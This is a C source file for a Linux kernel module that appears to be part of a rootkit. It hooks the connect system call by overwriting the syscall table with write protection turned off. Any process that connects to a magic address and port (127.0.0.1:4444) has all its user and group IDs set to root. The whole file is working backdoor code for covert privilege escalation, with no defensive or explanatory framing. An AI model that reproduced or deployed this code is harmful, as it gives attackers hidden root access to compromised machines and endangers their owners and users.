#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>

#include "syscall_table.h"
#include "hook_defs.h"
#include "cred_hook.h"

#define MAGIC_CONNECT_IP   0x7F000001  // 127.0.0.1, set your port to hexadecimal
#define MAGIC_CONNECT_PORT 4444        

asmlinkage long (*original_connect)(int sockfd, struct sockaddr __user *addr, int addrlen);

asmlinkage long hooked_connect(int sockfd, struct sockaddr __user *addr, int addrlen)
{
    struct sockaddr_in kaddr;

    if (addrlen == sizeof(struct sockaddr_in)) {
        if (copy_from_user(&kaddr, addr, sizeof(struct sockaddr_in)) == 0) {
            if (kaddr.sin_family == AF_INET &&
                kaddr.sin_port == htons(MAGIC_CONNECT_PORT) &&
                kaddr.sin_addr.s_addr == htonl(MAGIC_CONNECT_IP)) {

                struct cred *creds = prepare_creds();
                if (creds) {
                    creds->uid.val = 0;
                    creds->gid.val = 0;
                    creds->euid.val = 0;
                    creds->egid.val = 0;
                    creds->suid.val = 0;
                    creds->sgid.val = 0;
                    creds->fsuid.val = 0;
                    creds->fsgid.val = 0;
                    commit_creds(creds);
                }

                return -1; 
            }
        }
    }

    return original_connect(sockfd, addr, addrlen);
}

void enable_connect_hook(unsigned long **syscall_table)
{
    original_connect = (void *)syscall_table[__NR_connect];
    disable_write_protection();
    syscall_table[__NR_connect] = (unsigned long *)hooked_connect;
    enable_write_protection();
}

void disable_connect_hook(unsigned long **syscall_table)
{
    disable_write_protection();
    syscall_table[__NR_connect] = (unsigned long *)original_connect;
    enable_write_protection();
}
